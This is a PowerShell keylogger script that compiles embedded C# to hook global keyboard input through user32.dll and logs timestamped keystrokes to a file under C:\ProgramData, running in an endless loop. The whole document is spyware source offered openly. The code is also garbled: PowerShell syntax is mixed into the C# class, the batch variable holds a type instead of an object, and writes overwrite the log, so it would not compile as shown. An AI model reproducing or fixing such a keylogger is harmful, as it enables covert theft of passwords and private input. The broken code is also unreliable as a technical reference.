# Set log file path
$logFile = "C:\ProgramData\keylogger.log"
$scriptName = "Keylogger.ps1"

# Function to log keystrokes and batch write every 50 characters
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO",
        [ref]$batch
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"

    # Accumulate keystrokes until 50 characters are reached
    if ($batch.Value.Length -lt 50) {
        $batch.Value += " " + $logEntry
    } else {
        Write-BatchToFile -Batch $batch -FilePath $logFile
        $batch.Value = " " + $logEntry
    }
}

function Write-BatchToFile($Batch, [string]$FilePath) {
    # Convert the batch into an array and append to file
    Set-Content -Path $FilePath -Value ($Batch.Value -join "`n")
    $Batch.Value.Clear()
}

# Load user32.dll for key interception
$signature = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static IntPtr hookID = IntPtr.Zero;

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private static HookProc proc = HookCallback;

    public static void Start() {
        hookID = SetHook(proc);
    }

    public static void Stop() {
        UnhookWindowsHookEx(hookID);
    }

    private static IntPtr SetHook(HookProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            [KeyLogger]::LogMessage ("$(ConsoleKey)vkCode)", "INFO", $batch)
        }
        return CallNextHookEx(hookID, nCode, wParam, lParam);
    }

    public static void LogMessage([string]$message, [string]$level = "INFO", [ref]$batch) {
        param ($message, $level, $batch)
        Log-Message @PSBoundParameters
    }
}
"@

# Compile the C# code and load it into PowerShell
Add-Type -TypeDefinition $signature -Language CSharp

# Initialize batch with empty string
$batch = [System.Text.StringBuilder]

# Set initial log message for starting keylogger
$logMessage = "Starting global keylogger."
[KeyLogger]::LogMessage($logMessage, "INFO", $batch)

# Start logging
[KeyLogger]::Start()

# Keep script running
while ($true) { Start-Sleep -Seconds 1 }

